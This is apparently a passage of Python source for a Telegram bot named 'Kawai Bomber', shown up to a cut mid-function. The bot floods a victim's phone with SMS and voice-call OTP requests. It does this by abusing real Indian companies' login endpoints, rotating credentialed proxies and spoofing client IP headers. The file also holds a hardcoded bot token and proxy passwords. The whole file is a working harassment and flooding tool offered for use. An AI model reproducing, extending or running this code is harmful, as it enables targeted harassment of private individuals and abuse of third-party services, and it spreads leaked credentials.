import asyncio
import aiohttp
import json
import sys
import random
import time
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Set, Optional, Tuple
from collections import defaultdict
from enum import Enum
import html
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Telegram Bot Imports
from telegram import (
    Update, 
    InlineKeyboardButton, 
    InlineKeyboardMarkup,
    InputFile,
    ReplyKeyboardMarkup,
    KeyboardButton
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
    ConversationHandler
)
from telegram.constants import ParseMode

# ==================== CONFIGURATION ====================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8165905656:AAH-rzFBoBCdKMb9A-wv2hx0Hm9RgvGa8m0")
ADMIN_IDS = {8291098446}  # Your user ID
APPROVED_USERS = set()
BANNED_USERS = set()
USER_DB = {}  # Store user info

# Conversation states
PHONE, CONFIRM, BOMB_TYPE = range(3)

# Anime-inspired emojis and ASCII art
EMOJIS = {
    "bomb": "💣",
    "phone": "📱",
    "call": "📞",
    "sms": "💬",
    "fire": "🔥",
    "rocket": "🚀",
    "warning": "⚠️",
    "success": "✅",
    "error": "❌",
    "clock": "⏰",
    "stats": "📊",
    "admin": "👑",
    "user": "👤",
    "ban": "🚫",
    "unban": "🔓",
    "settings": "⚙️",
    "power": "⚡",
    "heart": "❤️",
    "star": "⭐",
    "flower": "🌸",
    "sparkles": "✨",
    "zap": "⚡",
    "boom": "💥",
    "cyclone": "🌀",
    "dizzy": "💫",
    "shield": "🛡️",
    "crown": "👑",
    "tada": "🎉",
    "confetti": "🎊",
    "sparkle": "❇️",
    "ring": "💍",
    "gem": "💎",
    "trophy": "🏆",
    "medal": "🏅"
}

# ASCII Art Banner
BANNER = """
╔═══╗╔╗    ╔═══╗╔╗ ╔╗╔════╗╔═══╗╔═══╗╔═══╗
║╔═╗║║║    ║╔══╝║║ ║║╚══╗═║║╔══╝║╔═╗║║╔══╝
║║ ╚╝║║    ║╚══╗║║ ║║  ╔╝╔╝║╚══╗║║ ║║║╚══╗
║║╔═╗║║ ╔╗ ║╔══╝║║ ║║ ╔╝╔╝ ║╔══╝║║ ║║║╔══╝
║╚╩═║║╚═╝║ ║╚══╗║╚═╝║╔╝═╚═╗║╚══╗║╚═╝║║╚══╗
╚═══╝╚═══╝ ╚═══╝╚═══╝╚════╝╚═══╝╚═══╝╚═══╝
"""

# Proxy List (formatted as host:port:username:password)
PROXY_LIST = [
    "px711001.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px043006.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px1160303.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px1400403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px022409.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px013304.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px390501.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px060301.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px014236.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px950403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px340403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016008.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px1210303.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px173003.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px500401.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px710701.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px041202.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px040805.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px580801.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px510201.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px990502.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px043004.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px810503.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px031901.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px210404.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px100801.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px031901.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px730503.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px350401.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px130501.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px380101.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px090404.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px490401.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px220601.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px410701.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px013401.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px052001.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016007.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px1390303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016007.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px121102.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px390501.pointtoserver.com:10780:purevpn0s12840722:vkgp6jo",
]

# API Endpoints (Enhanced with more services)
APIS = [
    # SMS APIs
    {
        "name": "Hungama",
        "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "type": "sms",
        "payload": {
            "mobileNo": "{phone}",
            "countryCode": "+91",
            "appCode": "un",
            "messageId": "1",
            "emailId": "",
            "subject": "Register",
            "priority": "1",
            "device": "web",
            "variant": "v1",
            "templateCode": 1
        },
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*"
        }
    },
    {
        "name": "Meru Cab",
        "endpoint": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "type": "sms",
        "payload": {"mobile_number": "{phone}"},
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "okhttp/4.9.0",
            "Mobilenumber": "{phone}"
        }
    },
    {
        "name": "Dayco India",
        "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "type": "sms",
        "payload": {"api": "send_otp", "brand": "dayco", "mob": "{phone}", "resend_otp": "resend_otp"},
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        }
    },
    {
        "name": "Doubtnut",
        "endpoint": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "type": "sms",
        "payload": {
            "app_version": "7.10.51",
            "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
            "course": "",
            "phone_number": "{phone}",
            "language": "en",
            "udid": "b751fb63c0ae17ba",
            "class": "",
            "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"
        },
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/5.0.0-alpha.2",
            "version_code": "1160"
        }
    },
    {
        "name": "NoBroker",
        "endpoint": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "type": "sms",
        "payload": {"phone": "{phone}", "countryCode": "IN"},
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "origin": "https://www.nobroker.in",
            "referer": "https://www.nobroker.in/"
        }
    },
    {
        "name": "Shiprocket",
        "endpoint": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "type": "sms",
        "payload": {"mobileNumber": "{phone}"},
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "authorization": "Bearer null"
        }
    },
    # Call APIs
    {
        "name": "Tata Capital",
        "endpoint": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "type": "call",
        "payload": {"phone": "{phone}", "applSource": "", "isOtpViaCallAtLogin": "true"},
        "headers": {
            "Content-Type": "application/json"
        }
    },
    {
        "name": "Physics Wallah",
        "endpoint": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
        "method": "POST",
        "type": "call",
        "payload": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{phone}"},
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/3.9.1"
        }
    },
    {
        "name": "1mg Pharmacy",
        "endpoint": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "type": "call",
        "payload": {"number": "{phone}", "is_corporate_user": False, "otp_on_call": True},
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/3.9.1"
        }
    },
    {
        "name": "Swiggy",
        "endpoint": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "type": "call",
        "payload": {"mobile": "{phone}"},
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "user-agent": "Swiggy-Android"
        }
    },
    {
        "name": "KPN Fresh",
        "endpoint": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "type": "sms",
        "payload": {"phone_number": {"number": "{phone}", "country_code": "+91"}},
        "headers": {
            "content-type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "x-channel-id": "WEB"
        }
    },
    {
        "name": "Servetel",
        "endpoint": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "type": "sms",
        "payload": {"mobile_number": "{phone}"},
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13)"
        }
    }
]

# ==================== GLOBAL VARIABLES ====================
active_bombs = {}
user_stats = defaultdict(lambda: {"sms_count": 0, "call_count": 0, "start_time": None, "total_sessions": 0})
bot_stats = {
    "total_users": 0,
    "active_bombs": 0,
    "total_sms": 0,
    "total_calls": 0,
    "total_sessions": 0,
    "uptime": datetime.now(),
    "requests_per_second": 0,
    "success_rate": 0
}

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self, proxies):
        self.proxies = proxies
        self.current_index = 0
        self.working_proxies = []
        self.failed_proxies = []
        
    def get_proxy(self):
        """Get next proxy in rotation"""
        if not self.proxies:
            return None
            
        proxy = self.proxies[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.proxies)
        return self.format_proxy(proxy)
    
    def get_random_proxy(self):
        """Get random proxy"""
        if not self.proxies:
            return None
        proxy = random.choice(self.proxies)
        return self.format_proxy(proxy)
    
    @staticmethod
    def format_proxy(proxy_str):
        """Format proxy string to aiohttp format"""
        if ":" not in proxy_str:
            return None
        
        try:
            host_port, username_password = proxy_str.rsplit(":", 1)
            host, port = host_port.rsplit(":", 1)
            username, password = username_password.split(":", 1)
            
            return {
                "http": f"http://{username}:{password}@{host}:{port}",
                "https": f"http://{username}:{password}@{host}:{port}"
            }
        except:
            return None

proxy_manager = ProxyManager(PROXY_LIST)

# ==================== BOMBING ENGINE ====================
class BombingEngine:
    def __init__(self, phone_number, user_id, bomb_type="sms"):
        self.phone_number = phone_number
        self.user_id = user_id
        self.bomb_type = bomb_type  # "sms", "call", or "both"
        self.running = False
        self.start_time = None
        self.sent_count = 0
        self.failed_count = 0
        self.last_update = datetime.now()
        self.active_apis = []
        
    async def start(self, duration_minutes=60):
        """Start bombing with time limit"""
        self.running = True
        self.start_time = datetime.now()
        
        # Filter APIs based on type
        if self.bomb_type == "sms":
            self.active_apis = [api for api in APIS if api["type"] == "sms"]
        elif self.bomb_type == "call":
            self.active_apis = [api for api in APIS if api["type"] == "call"]
        else:  # both
            self.active_apis = APIS
        
        # Create tasks for each API
        tasks = []
        for api in self.active_apis:
            task = asyncio.create_task(self.bomb_with_api(api))
            tasks.append(task)
        
        # Calculate duration (0 means unlimited)
        if duration_minutes > 0:
            try:
                await asyncio.sleep(duration_minutes * 60)
            except asyncio.CancelledError:
                pass
        else:
            # Unlimited - wait until stopped
            while self.running:
                await asyncio.sleep(1)
        
        # Stop all tasks
        self.running = False
        for task in tasks:
            task.cancel()
        
        return self.sent_count
    
    async def bomb_with_api(self, api):
        """Continuously bomb using a specific API"""
        while self.running:
            try:
                success = await self.send_request(api)
                if success:
                    self.sent_count += 1
                    
                    # Update stats based on type
                    if api["type"] == "sms":
                        user_stats[self.user_id]["sms_count"] += 1
                        bot_stats["total_sms"] += 1
                    else:
                        user_stats[self.user_id]["call_count"] += 1
                        bot_stats["total_calls"] += 1
                
                # Adaptive delay based on success rate
                delay = random.uniform(0.05, 0.2) if success else random.uniform(0.5, 1.0)
                await asyncio.sleep(delay)
                
            except Exception as e:
                self.failed_count += 1
                await asyncio.sleep(0.5)
    
    async def send_request(self, api):
        """Send request with proxy rotation"""
        try:
            proxy = proxy_manager.get_random_proxy()
            timeout = aiohttp.ClientTimeout(total=3)
            
            connector = aiohttp.TCPConnector(ssl=False)
            proxy_url = proxy.get("http") if proxy else None
            
            async with aiohttp.ClientSession(
                connector=connector, 
                timeout=timeout,
                headers=api.get("headers", {})
            ) as session:
                # Prepare payload
                payload = api["payload"].copy()
                for key, value in payload.items():
                    if isinstance(value, str) and "{phone}" in value:
                        payload[key] = value.replace("{phone}", self.phone_number)
                
                # Add random IP headers
                headers = api.get("headers", {}).copy()
                random_ip = f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
                headers["X-Forwarded-For"] = random_ip
                headers["Client-IP"] = random_ip
                
                # Send request
                if api["method"] == "POST":
                    if headers.get("Content-Type", "").startswith("application/x-www-form-urlencoded"):
                        # Form encoded
                        data = aiohttp.FormData()
                        for k, v in payload.items():
                            data.add_field(k, str(v))
                        
                        async with session.post(
                            api["endpoint"], 
                            data=data, 
                            headers=headers,
                            proxy=proxy_url
                        ) as response:
                            return response.status in [200, 201]
                    else:
                        # JSON
                        async with session.post(
                            api["endpoint"], 
                            json=payload, 
                            headers=headers,
                            proxy=proxy_url
                        ) as response:
                            return response.status in [200, 201]
                else:
                    # GET request (if needed)
                    async with session.get(
                        api["endpoint"],
                        headers=headers,
                        proxy=proxy_url
                    ) as response:
                        return response.status in [200, 201]
                        
        except Exception as e:
            return False
    
    def get_stats(self):
        """Get current bombing stats"""
        duration = datetime.now() - self.start_time if self.start_time else timedelta(0)
        success_rate = (self.sent_count / (self.sent_count + self.failed_count)) * 100 if (self.sent_count + self.failed_count) > 0 else 0
        
        return {
            "sent": self.sent_count,
            "failed": self.failed_count,
            "duration": duration,
            "success_rate": success_rate,
            "active_apis": len(self.active_apis)
        }

# ==================== TELEGRAM BOT HANDLERS ====================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send welcome message with anime style"""
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name
    
    # Check if banned
    if user_id in BANNED_USERS:
        await update.message.reply_text(
            f"{EMOJIS['ban']} <b>You are banned from using this bot!</b>\n"
            f"{EMOJIS['warning']} Contact admin if this is a mistake.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Register user
    if user_id not in USER_DB:
        USER_DB[user_id] = {
            "username": username,
            "join_date": datetime.now(),
            "is_premium": user_id in APPROVED_USERS
        }
        bot_stats["total_users"] += 1
    
    # Create anime-style welcome message
    welcome_text = f"""
{EMOJIS['sparkles']} <b>｡☆✼★━━━━━━━━━━━━━━━★✼☆｡</b>
{EMOJIS['crown']} <b>Kawai Bomber v2.0</b> {EMOJIS['crown']}
<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['flower']} <b>Welcome, {username}!</b> {EMOJIS['flower']}

{EMOJIS['zap']} <b>⚡ Ultra-Fast Bombing Engine</b>
{EMOJIS['shield']} <b>🔄 40+ Proxy Rotation</b>
{EMOJIS['clock']} <b>⏰ Smart Time Management</b>
{EMOJIS['trophy']} <b>📊 Real-time Statistics</b>

<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['star']} <b>Available Commands:</b>
• /bomb - Start bombing session
• /stop - Stop active bombing
• /status - View bot statistics
• /mystats - Your personal stats
• /help - Show help menu

{EMOJIS['warning']} <b>Important:</b> Use responsibly!
<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
{EMOJIS['heart']} <i>Made with love by @zerocyph</i>
{EMOJIS['power']} <i>Powered by Kawai Technology</i>
<b>｡☆✼★━━━━━━━━━━━━━━━★✼☆｡</b>
"""
    
    # Create keyboard
    keyboard = [
        [
            InlineKeyboardButton(f"{EMOJIS['bomb']} Start Bombing", callback_data="start_bomb"),
            InlineKeyboardButton(f"{EMOJIS['stats']} Stats", callback_data="show_stats")
        ],
        [
            InlineKeyboardButton(f"{EMOJIS['tada']} Quick Start", callback_data="quick_start"),
            InlineKeyboardButton(f"{EMOJIS['help']} Help", callback_data="help_menu")
        ]
    ]
    
    # Add admin panel button for admins
    if user_id in ADMIN_IDS:
        keyboard.append([
            InlineKeyboardButton(f"{EMOJIS['admin']} Admin Panel", callback_data="admin_panel")
        ])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Send welcome message
    await update.message.reply_text(
        welcome_text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start bombing command with conversation"""
    user_id = update.effective_user.id
    
    # Check if banned
    if user_id in BANNED_USERS:
        await update.message.reply_text(
            f"{EMOJIS['ban']} <b>You are banned!</b>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if already bombing
    if user_id in active_bombs:
        await update.message.reply_text(
            f"{EMOJIS['warning']} <b>You already have an active bombing session!</b>\n"
            f"Use /stop to stop it first.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Ask for phone number
    await update.message.reply_text(
        f"{EMOJIS['phone']} <b>Enter the target phone number (without +91):</b>\n"
        f"{EMOJIS['warning']} <i>Example: 9876543210</i>",
        parse_mode=ParseMode.HTML
    )
    
    return PHONE

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle phone number input"""
    phone = update.message.text.strip()
    
    # Validate phone number
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text(
            f"{EMOJIS['error']} <b>Invalid phone number!</b>\n"
            f"Please enter 10 digits without +91\n\n"
            f"Try again:",
            parse_mode=ParseMode.HTML
        )
        return PHONE
    
    context.user_data["phone"] = phone
    
    # Ask for confirmation
    keyboard = [
        [
            InlineKeyboardButton(f"{EMOJIS['success']} Yes, proceed", callback_data="confirm_yes"),
            InlineKeyboardButton(f"{EMOJIS['error']} No, cancel", callback_data="confirm_no")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"{EMOJIS['warning']} <b>Confirm Target:</b>\n"
        f"<code>{phone}</code>\n\n"
        f"{EMOJIS['fire']} <b>Are you sure you want to bomb this number?</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )
    
    return CONFIRM

async def handle_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle confirmation"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "confirm_no":
        await query.edit_message_text(
            f"{EMOJIS['success']} <b>Bombing cancelled!</b>",
            parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END
    
    # Show bombing type selection
    keyboard = [
        [
            InlineKeyboardButton(f"{EMOJIS['sms']} SMS Only", callback_data="type_sms"),
            InlineKeyboardButton(f"{EMOJIS['call']} Call Only", callback_data="type_call")
        ],
        [
            InlineKeyboardButton(f"{EMOJIS['fire']} Both (SMS + Call)", callback_data="type_both"),
            InlineKeyboardButton(f"{EMOJIS['zap']} Extreme Mode", callback_data="type_extreme")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"{EMOJIS['bomb']} <b>Select Bombing Type:</b>\n\n"
        f"{EMOJIS['sms']} <b>SMS Only</b> - Send SMS only\n"
        f"{EMOJIS['call']} <b>Call Only</b> - Make calls only\n"
        f"{EMOJIS['fire']} <b>Both</b> - SMS + Calls\n"
        f"{EMOJIS['zap']} <b>Extreme</b> - Maximum aggression",
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )
    
    return BOMB_TYPE

async def handle_bomb_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle bombing type selection and start bombing"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    phone = context.user_data["phone"]
    bomb_type = query.data.replace("type_", "")
    
    # Calculate duration (0 means unlimited for approved users/admins)
    if user_id in ADMIN_IDS or user_id in APPROVED_USERS:
        duration = 0  # Unlimited
        duration_text = "∞ (Unlimited)"
    else:
        duration = 60  # 1 hour
        duration_text = "60 minutes"
    
    # Map bomb types
    type_map = {
        "sms": "SMS Only",
        "call": "Call Only",
        "both": "SMS + Call",
        "extreme": "Extreme Mode"
    }
    
    # Start bombing
    engine = BombingEngine(phone, user_id, bomb_type)
    
    # Store in active bombs
    active_bombs[user_id] = {
        "engine": engine,
        "phone": phone,
        "start_time": datetime.now(),
        "type": bomb_type,
        "message_id": None
    }
    
    bot_stats["active_bombs"] += 1
    bot_stats["total_sessions"] += 1
    user_stats[user_id]["total_sessions"] += 1
    
    # Start bombing in background
    asyncio.create_task(engine.start(duration))
    
    # Send success message with live stats
    message = await query.edit_message_text(
        f"{EMOJIS['rocket']} <b>BOMBING INITIATED!</b> {EMOJIS['rocket']}\n\n"
        f"{EMOJIS['target']} <b>Target:</b> <code>{phone}</code>\n"
        f"{EMOJIS['bomb']} <b>Mode:</b> {type_map[bomb_type]}\n"
        f"{EMOJIS['clock']} <b>Duration:</b> {duration_text}\n"
        f"{EMOJIS['proxy']} <b>Proxies:</b> {len(PROXY_LIST)} active\n"
        f"{EMOJIS['zap']} <b>Status:</b> <i>Starting engines...</i>\n\n"
        f"{EMOJIS['fire']} <b>Initializing attack sequence...</b>",
        parse_mode=ParseMode.HTML
    )
    
    # Store message ID for updates
    active_bombs[user_id]["message_id"] = message.message_id
    
    # Start live updates
    asyncio.create_task(update_bombing_stats(update, context, user_id))
    
    return ConversationHandler.END

async def update_bombing_stats(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    """Update bombing stats in real-time"""
    chat_id = update.effective_chat.id
    
    while user_id in active_bombs:
        try:
            bomb_info = active_bombs[user_id]
            engine = bomb_info["engine"]
            stats = engine.get_stats()
            
            # Calculate speed
            duration_seconds = stats["duration"].total_seconds()
            speed = stats["sent"] / duration_seconds if duration_seconds > 0 else 0
            
            # Create progress bar
            progress = min(stats["sent"] / 100, 1.0)  # Cap at 100 for progress bar
            bar_length = 20
            filled = int(bar_length * progress)
            bar = "█" * filled + "░" * (bar_length - filled)
            
            # Update message
            status_text = f"""
{EMOJIS['rocket']} <b>⚡ LIVE BOMBING IN PROGRESS ⚡</b>

{EMOJIS['target']} <b>Target:</b> <code>{bomb_info['phone']}</code>
{EMOJIS['fire']} <b>Mode:</b> {bomb_info['type'].upper()}
{EMOJIS['clock']} <b>Duration:</b> {str(stats['duration']).split('.')[0]}

{EMOJIS['bar_chart']} <b>Progress:</b> [{bar}] {progress*100:.1f}%

{EMOJIS['stats']} <b>Statistics:</b>
├─ {EMOJIS['success']} <b>Successful:</b> {stats['sent']}
├─ {EMOJIS['error']} <b>Failed:</b> {stats['failed']}
├─ {EMOJIS['speed']} <b>Speed:</b> {speed:.1f}/sec
└─ {EMOJIS['rate']} <b>Success Rate:</b> {stats['success_rate']:.1f}%

{EMOJIS['warning']} Use /stop to end bombing
"""
            
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=bomb_info["message_id"],
                    text=status_text,
                    parse_mode=ParseMode.HTML
                )
            except:
                pass
            
            await asyncio.sleep(3)  # Update every 3 seconds
            
        except Exception as e:
            break

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop active bombing"""
    user_id = update.effective_user.id
    
    if user_id not in active_bombs:
        await update.message.reply_text(
            f"{EMOJIS['warning']} <b>No active bombing session found!</b>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Get stats before stopping
    bomb_info = active_bombs[user_id]
    engine = bomb_info["engine"]
    stats = engine.get_stats()
    
    # Stop engine
    engine.running = False
    
    # Remove from active bombs
    del active_bombs[user_id]
    bot_stats["active_bombs"] = max(0, bot_stats["active_bombs"] - 1)
    
    # Send summary
    summary_text = f"""
{EMOJIS['success']} <b>BOMBING COMPLETED!</b> {EMOJIS['success']}

{EMOJIS['target']} <b>Target:</b> <code>{bomb_info['phone']}</code>
{EMOJIS['clock']} <b>Duration:</b> {str(stats['duration']).split('.')[0]}

{EMOJIS['trophy']} <b>Final Statistics:</b>
├─ {EMOJIS['success']} <b>Successful Hits:</b> {stats['sent']}
├─ {EMOJIS['error']} <b>Failed Attempts:</b> {stats['failed']}
├─ {EMOJIS['rate']} <b>Success Rate:</b> {stats['success_rate']:.1f}%
└─ {EMOJIS['api']} <b>APIs Used:</b> {stats['active_apis']}

{EMOJIS['fire']} <b>Total Damage:</b> {stats['sent'] + stats['failed']}

{EMOJIS['star']} <i>Session ended successfully!</i>
"""
    
    await update.message.reply_text(
        summary_text,
        parse_mode=ParseMode.HTML
    )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show bot statistics"""
    uptime = datetime.now() - bot_stats["uptime"]
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{hours}h {minutes}m {seconds}s"
    
    # Calculate requests per second
    total_requests = bot_stats["total_sms"] + bot_stats["total_calls"]
    total_time = uptime.total_seconds()
    rps = total_requests / total_time if total_time > 0 else 0
    
    status_text = f"""
{EMOJIS['stats']} <b>📊 KAWAI BOMBER STATISTICS 📊</b>
<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['server']} <b>System Status:</b>
├─ {EMOJIS['clock']} <b>Uptime:</b> {uptime_str}
├─ {EMOJIS['activity']} <b>Active Bombs:</b> {bot_stats['active_bombs']}
├─ {EMOJIS['speed']} <b>Requests/sec:</b> {rps:.2f}
└─ {EMOJIS['users']} <b>Total Users:</b> {bot_stats['total_users']}

{EMOJIS['bomb']} <b>Attack Statistics:</b>
├─ {EMOJIS['sms']} <b>Total SMS:</b> {bot_stats['total_sms']}
├─ {EMOJIS['call']} <b>Total Calls:</b> {bot_stats['total_calls']}
├─ {EMOJIS['total']} <b>Total Requests:</b> {total_requests}
└─ {EMOJIS['sessions']} <b>Total Sessions:</b> {bot_stats['total_sessions']}

{EMOJIS['proxy']} <b>Proxy System:</b>
├─ {EMOJIS['list']} <b>Total Proxies:</b> {len(PROXY_LIST)}
├─ {EMOJIS['working']} <b>Working:</b> {len(PROXY_LIST)}
└─ {EMOJIS['rotation']} <b>Rotation:</b> Active

{EMOJIS['api']} <b>API Endpoints:</b>
├─ {EMOJIS['sms']} <b>SMS APIs:</b> {len([a for a in APIS if a['type'] == 'sms'])}
├─ {EMOJIS['call']} <b>Call APIs:</b> {len([a for a in APIS if a['type'] == 'call'])}
└─ {EMOJIS['total']} <b>Total APIs:</b> {len(APIS)}

<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
{EMOJIS['heart']} <i>Made by @zerocyph</i>
{EMOJIS['power']} <i>Powered by Kawai Technology</i>
"""
    
    await update.message.reply_text(
        status_text,
        parse_mode=ParseMode.HTML
    )

async def mystats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user statistics"""
    user_id = update.effective_user.id
    stats = user_stats[user_id]
    
    # Calculate user level based on activity
    total_attacks = stats["sms_count"] + stats["call_count"]
    
    if total_attacks < 100:
        level = "🌱 Beginner"
    elif total_attacks < 500:
        level = "🔥 Intermediate"
    elif total_attacks < 1000:
        level = "⚡ Advanced"
    else:
        level = "👑 Master"
    
    mystats_text = f"""
{EMOJIS['sparkles']} <b>YOUR STATISTICS</b> {EMOJIS['sparkles']}
<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['user']} <b>User Info:</b>
├─ {EMOJIS['level']} <b>Level:</b> {level}
├─ {EMOJIS['sessions']} <b>Total Sessions:</b> {stats['total_sessions']}
└─ {EMOJIS['status']} <b>Account Status:</b> {'Premium' if user_id in APPROVED_USERS else 'Free'}

{EMOJIS['attack']} <b>Attack History:</b>
├─ {EMOJIS['sms']} <b>SMS Sent:</b> {stats['sms_count']}
├─ {EMOJIS['call']} <b>Calls Made:</b> {stats['call_count']}
